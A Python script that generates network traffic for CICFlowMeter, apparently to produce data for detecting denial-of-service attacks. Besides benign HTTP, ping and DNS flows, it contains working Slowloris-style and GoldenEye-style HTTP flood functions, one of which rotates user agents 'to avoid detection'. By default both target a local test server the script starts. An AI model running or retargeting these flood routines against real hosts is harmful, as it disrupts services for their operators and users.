#!/usr/bin/env python3
"""
Network Traffic Generator for CICFlowMeter Testing
Generates various types of network flows that CICFlowMeter can analyze
Enhanced for eth2 interface testing
"""

import requests
import socket
import threading
import time
import random
import subprocess
import os
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler
import json


class SimpleHTTPHandler(BaseHTTPRequestHandler):
    """Simple HTTP request handler for local traffic generation"""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        response = {
            "method": "GET",
            "path": self.path,
            "timestamp": time.time(),
            "client": self.client_address[0],
        }
        self.wfile.write(json.dumps(response).encode())

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)

        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        response = {
            "method": "POST",
            "path": self.path,
            "timestamp": time.time(),
            "client": self.client_address[0],
            "data_received": len(post_data),
        }
        self.wfile.write(json.dumps(response).encode())

    def log_message(self, format, *args):
        # Suppress default logging
        pass


class TrafficGenerator:
    def __init__(self, interface="eth2", local_ip="10.49.187.221"):
        self.running = False
        self.interface = interface
        self.local_ip = local_ip  # Use current eth2 IP
        self.local_server = None
        self.server_thread = None

    def start_local_server(self, port=8888):
        """Start local HTTP server for generating local traffic"""
        print(f"🌐 Starting local HTTP server on 0.0.0.0:{port}...")

        actual_port = port  # Keep track of actual port used

        class ThreadedHTTPServer(threading.Thread):
            def __init__(self, host, port, handler):
                threading.Thread.__init__(self)
                self.daemon = True
                self.actual_port = port
                try:
                    # Bind to all interfaces instead of specific IP
                    self.server = HTTPServer(("0.0.0.0", port), handler)
                except OSError as e:
                    print(f"❌ Failed to bind to port {port}: {e}")
                    # Try alternative ports
                    for alt_port in range(port + 1, port + 10):
                        try:
                            print(f"🔄 Trying alternative port {alt_port}...")
                            self.server = HTTPServer(("0.0.0.0", alt_port), handler)
                            self.actual_port = alt_port
                            break
                        except OSError:
                            continue
                    else:
                        raise Exception(
                            f"Could not bind to any port in range {port}-{port+9}"
                        )

            def run(self):
                self.server.serve_forever()

            def stop(self):
                self.server.shutdown()

        self.local_server = ThreadedHTTPServer("0.0.0.0", port, SimpleHTTPHandler)
        actual_port = self.local_server.actual_port
        self.local_server.start()
        time.sleep(1)  # Give server time to start

        # Use local IP for client connections but server binds to all interfaces
        server_url = f"http://{self.local_ip}:{actual_port}"
        print(f"✅ Local server started at {server_url}")
        return server_url

    def stop_local_server(self):
        """Stop local HTTP server"""
        if self.local_server:
            self.local_server.stop()
            print("🛑 Local server stopped")

    def generate_local_http_traffic(self, count=20, server_port=8888):
        """Generate HTTP traffic to local server on eth2 interface"""
        server_url = self.start_local_server(server_port)
        print(f"🚦 Generating {count} local HTTP flows on {self.interface}...")

        for i in range(count):
            try:
                # Mix of GET and POST requests
                if i % 3 == 0:
                    # POST request with data
                    data = {"test_id": i, "data": "x" * random.randint(100, 1000)}
                    response = requests.post(
                        f"{server_url}/api/test", json=data, timeout=5
                    )
                    print(
                        f"  📤 POST {i+1}/{count}: {response.status_code} ({len(str(data))} bytes)"
                    )
                else:
                    # GET request
                    response = requests.get(
                        f"{server_url}/test?id={i}&ts={time.time()}", timeout=5
                    )
                    print(f"  📥 GET {i+1}/{count}: {response.status_code}")

                time.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                print(f"  ❌ HTTP Error {i+1}: {e}")

        time.sleep(2)  # Let connections settle
        self.stop_local_server()

    def generate_ping_traffic(self, targets=None, count=10):
        """Generate ICMP ping traffic through eth2"""
        if targets is None:
            targets = ["8.8.8.8", "1.1.1.1", "google.com"]

        print(f"🏓 Generating ICMP ping traffic from {self.interface}...")

        for target in targets:
            print(f"  Pinging {target}...")
            try:
                # Use ping command to generate ICMP traffic
                result = subprocess.run(
                    ["ping", "-I", self.interface, "-c", str(count), target],
                    capture_output=True,
                    text=True,
                    timeout=30,
                )

                if result.returncode == 0:
                    # Parse successful pings from output
                    lines = result.stdout.strip().split("\n")
                    success_lines = [l for l in lines if " time=" in l]
                    print(
                        f"    ✅ {len(success_lines)}/{count} pings successful to {target}"
                    )
                else:
                    print(f"    ❌ Ping failed to {target}")
            except Exception as e:
                print(f"    ❌ Ping error to {target}: {e}")

            time.sleep(1)

    def generate_iperf_traffic(self, duration=10):
        """Generate iperf3 traffic for bandwidth testing"""
        print(f"🚀 Attempting to generate iperf3 traffic on {self.interface}...")

        # Common iperf3 public servers (may not always be available)
        servers = ["iperf.scottlinux.com", "ping.online.net", "bouygues.iperf.fr"]

        for server in servers:
            try:
                print(f"  Testing with {server}...")
                result = subprocess.run(
                    ["iperf3", "-c", server, "-t", str(duration), "-B", self.local_ip],
                    capture_output=True,
                    text=True,
                    timeout=duration + 10,
                )

                if result.returncode == 0:
                    # Extract bandwidth from output
                    lines = result.stdout.strip().split("\n")
                    for line in lines:
                        if "sender" in line and "Mbits/sec" in line:
                            print(f"    ✅ {line.strip()}")
                            break
                    return True
                else:
                    print(f"    ❌ iperf3 failed with {server}")
            except subprocess.TimeoutExpired:
                print(f"    ⏰ iperf3 timeout with {server}")
            except FileNotFoundError:
                print(f"    ❌ iperf3 not installed (sudo apt install iperf3)")
                break
            except Exception as e:
                print(f"    ❌ iperf3 error with {server}: {e}")

        return False

    def simulate_edos_patterns(self, target_port=8888, duration=30):
        """Simulate EDoS attack patterns for testing detection"""
        server_url = self.start_local_server(target_port)
        print(f"🎯 Simulating EDoS patterns for {duration}s on {self.interface}...")

        start_time = time.time()
        request_count = 0

        def slow_http_pattern():
            """Simulate SlowHTTP attack pattern"""
            nonlocal request_count
            try:
                # Slow HTTP POST with partial content
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "1000000",  # Claim large content
                }
                response = requests.post(
                    f"{server_url}/slow",
                    headers=headers,
                    data="partial_data=" + "x" * 100,
                    timeout=2,
                )
                request_count += 1
                print(f"    📡 SlowHTTP attempt: {response.status_code}")
            except requests.exceptions.Timeout:
                request_count += 1
                print(f"    ⏳ SlowHTTP timeout (expected)")
            except Exception as e:
                print(f"    ❌ SlowHTTP error: {e}")

        def rapid_request_pattern():
            """Simulate rapid request pattern"""
            nonlocal request_count
            for _ in range(5):
                try:
                    response = requests.get(
                        f"{server_url}/rapid?t={time.time()}", timeout=1
                    )
                    request_count += 1
                except:
                    pass

        print("  🐌 Starting SlowHTTP simulation...")
        print("  ⚡ Starting rapid request simulation...")

        while time.time() - start_time < duration:
            # Mix of patterns
            if random.random() < 0.3:
                slow_http_pattern()
            if random.random() < 0.5:
                rapid_request_pattern()

            time.sleep(random.uniform(0.1, 1.0))

        elapsed = time.time() - start_time
        print(
            f"  📊 EDoS simulation complete: {request_count} requests in {elapsed:.1f}s"
        )
        self.stop_local_server()

    def eth2_comprehensive_test(self):
        """Comprehensive traffic generation test for eth2 interface"""
        print(f"🔬 Starting comprehensive eth2 ({self.local_ip}) traffic test...")

        tests = [
            ("Local HTTP Traffic", lambda: self.generate_local_http_traffic(15, 8881)),
            (
                "ICMP Ping Traffic",
                lambda: self.generate_ping_traffic(["8.8.8.8", "1.1.1.1"], 5),
            ),
            ("External HTTP Traffic", lambda: self.generate_http_flows(5)),
            ("EDoS Pattern Simulation", lambda: self.simulate_edos_patterns(8882, 15)),
            ("UDP Traffic", lambda: self.generate_udp_traffic(8)),
        ]

        for test_name, test_func in tests:
            print(f"\n🧪 {test_name}")
            print("=" * 50)
            try:
                test_func()
                print(f"✅ {test_name} completed")
            except Exception as e:
                print(f"❌ {test_name} failed: {e}")

            print("⏸️  Waiting 3s before next test...")
            time.sleep(3)

        print("\n🎉 Comprehensive eth2 traffic test complete!")
        print("\n💡 Now run CICFlowMeter with:")
        print(
            f"   sudo -E ./.venv/bin/cicflowmeter -i {self.interface} -u http://localhost:23332/predict/buffered"
        )

    def generate_http_flows(self, count=10):
        """Generate HTTP GET/POST requests to create TCP flows"""
        print(f"Generating {count} HTTP flows...")

        urls = [
            "http://httpbin.org/get",
            "http://httpbin.org/headers",
            "http://httpbin.org/user-agent",
            "http://httpbin.org/ip",
        ]

        for i in range(count):
            try:
                url = random.choice(urls)
                response = requests.get(f"{url}?id={i}", timeout=5)
                print(f"  HTTP GET {i+1}/{count}: {response.status_code}")
                time.sleep(0.5)
            except Exception as e:
                print(f"  HTTP Error {i+1}: {e}")

    def generate_https_flows(self, count=5):
        """Generate HTTPS requests to create encrypted TCP flows"""
        print(f"Generating {count} HTTPS flows...")

        urls = [
            "https://httpbin.org/get",
            "https://api.github.com/users/octocat",
            "https://jsonplaceholder.typicode.com/posts/1",
        ]

        for i in range(count):
            try:
                url = random.choice(urls)
                response = requests.get(f"{url}?secure={i}", timeout=5)
                print(f"  HTTPS GET {i+1}/{count}: {response.status_code}")
                time.sleep(0.8)
            except Exception as e:
                print(f"  HTTPS Error {i+1}: {e}")

    def generate_tcp_connections(self, count=5):
        """Generate raw TCP connections to various ports"""
        print(f"Generating {count} TCP connection flows...")

        hosts_ports = [
            ("google.com", 80),
            ("github.com", 443),
            ("stackoverflow.com", 80),
            ("httpbin.org", 80),
        ]

        for i in range(count):
            try:
                host, port = random.choice(hosts_ports)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((host, port))
                if result == 0:
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    data = sock.recv(1024)
                    print(f"  TCP {i+1}/{count}: Connected to {host}:{port}")
                sock.close()
                time.sleep(0.3)
            except Exception as e:
                print(f"  TCP Error {i+1}: {e}")

    def generate_udp_traffic(self, count=10):
        """Generate UDP traffic (DNS-like)"""
        print(f"Generating {count} UDP flows...")

        # DNS servers to query
        dns_servers = [
            "8.8.8.8",  # Google DNS
            "1.1.1.1",  # Cloudflare DNS
            "208.67.222.222",  # OpenDNS
        ]

        for i in range(count):
            try:
                server = random.choice(dns_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)

                # Simple DNS query packet (just to generate UDP traffic)
                dns_query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
                sock.sendto(dns_query, (server, 53))

                try:
                    response = sock.recv(1024)
                    print(f"  UDP {i+1}/{count}: DNS query to {server}")
                except socket.timeout:
                    print(f"  UDP {i+1}/{count}: DNS timeout to {server}")

                sock.close()
                time.sleep(0.2)
            except Exception as e:
                print(f"  UDP Error {i+1}: {e}")

    def continuous_background_traffic(self, duration=60):
        """Generate continuous background traffic for specified duration"""
        print(f"Starting continuous background traffic for {duration} seconds...")
        self.running = True

        def http_worker():
            while self.running:
                try:
                    response = requests.get(
                        f"http://httpbin.org/get?bg={time.time()}", timeout=3
                    )
                    print(f"  Background HTTP: {response.status_code}")
                except:
                    pass
                time.sleep(random.uniform(2, 5))

        def https_worker():
            while self.running:
                try:
                    response = requests.get(f"https://httpbin.org/uuid", timeout=3)
                    print(f"  Background HTTPS: {response.status_code}")
                except:
                    pass
                time.sleep(random.uniform(3, 7))

        # Start background workers
        threading.Thread(target=http_worker, daemon=True).start()
        threading.Thread(target=https_worker, daemon=True).start()

        # Run for specified duration
        time.sleep(duration)
        self.running = False
        print("Background traffic stopped.")

    def generate_mixed_traffic(self):
        """Generate a mix of different traffic types"""
        print("=== Generating Mixed Network Traffic ===")

        with ThreadPoolExecutor(max_workers=4) as executor:
            # Submit different traffic generation tasks
            futures = [
                executor.submit(self.generate_http_flows, 8),
                executor.submit(self.generate_https_flows, 4),
                executor.submit(self.generate_tcp_connections, 3),
                executor.submit(self.generate_udp_traffic, 6),
            ]

            # Wait for all to complete
            for future in futures:
                future.result()

        print("=== Mixed traffic generation complete ===")

    def slowhttp_attack(self, target_ip="10.49.187.221", target_port=9888, duration=60):
        """Simulate SlowHTTP attack (SlowLoris style)"""
        print(
            f"🐌 Starting SlowHTTP attack on {target_ip}:{target_port} for {duration}s..."
        )

        # Start target server first
        server_url = self.start_local_server(target_port)
        start_time = time.time()
        connections = []

        # Create multiple slow connections
        for i in range(15):  # 15 slow connections
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))

                # Send partial HTTP request
                partial_request = f"GET /slow{i} HTTP/1.1\r\nHost: {target_ip}\r\n"
                sock.send(partial_request.encode())
                connections.append(sock)

                print(f"🔗 SlowHTTP connection {i+1}/15 established")
                time.sleep(1)  # Slow connection establishment

            except Exception as e:
                print(f"⚠️ SlowHTTP connection {i} failed: {e}")
                continue

        # Keep connections alive with slow headers
        header_count = 0
        while (time.time() - start_time) < duration and connections:
            for i, sock in enumerate(connections[:]):
                try:
                    # Send one header line every 15 seconds (very slow)
                    slow_header = f"X-Slow-Header-{header_count}: keepalive{i}\r\n"
                    sock.send(slow_header.encode())
                    print(
                        f"📤 SlowHTTP sent header to connection {i} (total headers: {header_count})"
                    )

                except Exception as e:
                    print(f"❌ SlowHTTP connection {i} died: {e}")
                    connections.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass

            header_count += 1
            time.sleep(15)  # Wait 15 seconds between header sends (slow attack)

        # Close remaining connections
        for sock in connections:
            try:
                sock.close()
            except:
                pass

        self.stop_local_server()
        print(f"🏁 SlowHTTP attack completed - {header_count} header rounds sent")

    def goldeneye_attack(
        self, target_ip="10.49.187.221", target_port=9889, duration=30
    ):
        """Simulate GoldenEye-style HTTP flood attack"""
        print(
            f"🥇 Starting GoldenEye attack on {target_ip}:{target_port} for {duration}s..."
        )

        # Start target server first
        server_url = self.start_local_server(target_port)
        start_time = time.time()
        request_count = 0

        # Prepare various HTTP requests to avoid detection
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        ]

        methods = ["GET", "POST", "HEAD"]
        paths = [
            "/",
            "/index.html",
            "/api/data",
            "/login",
            "/search",
            f"/attack{int(time.time())}",
        ]

        while (time.time() - start_time) < duration:
            try:
                # Rapid fire connections
                for i in range(100):  # 100 rapid requests per batch
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)

                    try:
                        sock.connect((target_ip, target_port))

                        # Randomized request to look more realistic
                        method = random.choice(methods)
                        path = random.choice(paths)
                        user_agent = random.choice(user_agents)

                        request = (
                            f"{method} {path}?flood={random.randint(1000,9999)} HTTP/1.1\r\n"
                            f"Host: {target_ip}\r\n"
                            f"User-Agent: {user_agent}\r\n"
                            f"Accept: text/html,application/xhtml+xml,*/*\r\n"
                            f"Connection: close\r\n"
                            f"X-Attack-ID: {request_count}\r\n\r\n"
                        )

                        sock.send(request.encode())
                        request_count += 1

                        # Don't wait for response, close immediately (flood style)
                        sock.close()

                    except Exception:
                        try:
                            sock.close()
                        except:
                            pass
                        continue

                print(f"⚡ GoldenEye batch sent: {request_count} total requests")
                time.sleep(0.5)  # Brief pause between batches

            except KeyboardInterrupt:
                break

        self.stop_local_server()
        print(f"🏁 GoldenEye attack completed: {request_count} requests sent")


def main():
    generator = TrafficGenerator()

    print("🔬 Network Traffic Generator for CICFlowMeter (eth2 focused)")
    print("=" * 65)
    print("1. 🎯 eth2 Comprehensive Test (recommended for CICFlowMeter)")
    print("2. 🚦 Local HTTP Traffic (eth2)")
    print("3. 🏓 ICMP Ping Traffic")
    print("4. 🎭 EDoS Pattern Simulation")
    print("5. 🌐 Mixed External Traffic")
    print("6. ⚡ Continuous Background Traffic")
    print("7. 🐌 SlowHTTP Attack (SlowLoris)")
    print("8. 🥇 GoldenEye HTTP Flood Attack")
    print("9. 📊 All Types Sequential")

    choice = input("\n🔹 Select option (1-9): ").strip()

    if choice == "1":
        generator.eth2_comprehensive_test()
    elif choice == "2":
        count = int(input("Number of local HTTP requests (default 20): ") or "20")
        generator.generate_local_http_traffic(count)
    elif choice == "3":
        count = int(input("Number of pings per target (default 10): ") or "10")
        generator.generate_ping_traffic(count=count)
    elif choice == "4":
        duration = int(
            input("EDoS simulation duration in seconds (default 30): ") or "30"
        )
        generator.simulate_edos_patterns(duration=duration)
    elif choice == "5":
        generator.generate_mixed_traffic()
    elif choice == "6":
        duration = int(input("Duration in seconds (default 60): ") or "60")
        generator.continuous_background_traffic(duration)
    elif choice == "7":
        duration = int(
            input("SlowHTTP attack duration in seconds (default 60): ") or "60"
        )
        generator.slowhttp_attack(duration=duration)
    elif choice == "8":
        duration = int(
            input("GoldenEye attack duration in seconds (default 30): ") or "30"
        )
        generator.goldeneye_attack(duration=duration)
    elif choice == "9":
        print("🔄 Running all traffic types...")
        generator.generate_local_http_traffic(10)
        time.sleep(2)
        generator.generate_ping_traffic(count=5)
        time.sleep(2)
        generator.generate_http_flows(5)
        time.sleep(2)
        generator.simulate_edos_patterns(duration=15)
        time.sleep(2)
        generator.generate_udp_traffic(8)
    else:
        print("❓ Invalid choice. Running comprehensive eth2 test...")
        generator.eth2_comprehensive_test()

    print("\n🎉 Traffic generation complete!")
    print("\n💡 Now run CICFlowMeter with enhanced logging:")
    print(
        f"   sudo -E ./.venv/bin/cicflowmeter -i eth2 -u http://localhost:23332/predict/buffered"
    )
    print(
        "\n📈 The CICFlowMeter should now show detailed logs of flows being processed and sent!"
    )


if __name__ == "__main__":
    main()
